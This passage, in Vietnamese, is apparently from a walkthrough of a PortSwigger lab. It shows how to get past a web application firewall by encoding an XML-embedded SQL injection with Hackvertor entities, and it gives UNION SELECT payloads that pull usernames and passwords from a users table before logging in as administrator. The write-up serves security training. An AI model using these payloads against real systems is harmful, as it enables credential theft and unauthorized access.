1. Khi bạn đang chèn vào XML, hãy thử làm xáo trộn tải trọng của bạn bằng cách sử dụng các thực thể XML. Một cách để làm điều này là sử dụng tiện ích mở rộng [Hackvertor](https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100). Chỉ cần đánh dấu đầu vào của bạn, nhấp chuột phải, sau đó chọn **Extensions &gt; Hackvertor &gt; Encode &gt; dec_entities/hex_entities**.
2. Gửi lại yêu cầu và thông báo rằng bây giờ bạn nhận được phản hồi bình thường từ đơn đăng ký. Điều này cho thấy rằng bạn đã vượt qua WAF thành công.

**Craft an exploit**

1. Tiếp tục nơi bạn đã dừng lại và suy ra rằng truy vấn trả về một cột duy nhất. Khi bạn cố gắng trả về nhiều cột, ứng dụng trả về `0 units`, ngụ ý lỗi.
2. Vì bạn chỉ có thể trả về một cột, bạn cần nối tên người dùng và mật khẩu được trả về, ví dụ:
    
    ```jsx
    <storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users</@hex_entities></storeId>
    ```
    
    ![image.png](/assets/img/portswigger/sql-injection/image%202.png)
    
    ```jsx
    <storeId><@dec_entities>1 UNION SELECT username || '~' || password FROM users</@dec_entities></storeId>
    ```
    
    ![image.png](/assets/img/portswigger/sql-injection/image%203.png)
    
3. Gửi truy vấn này và quan sát xem bạn đã tìm nạp thành công tên người dùng và mật khẩu từ cơ sở dữ liệu, được phân tách bằng ký tự `~`.
4. Sử dụng thông tin đăng nhập của quản trị viên để đăng nhập và giải quyết phòng thí nghiệm.
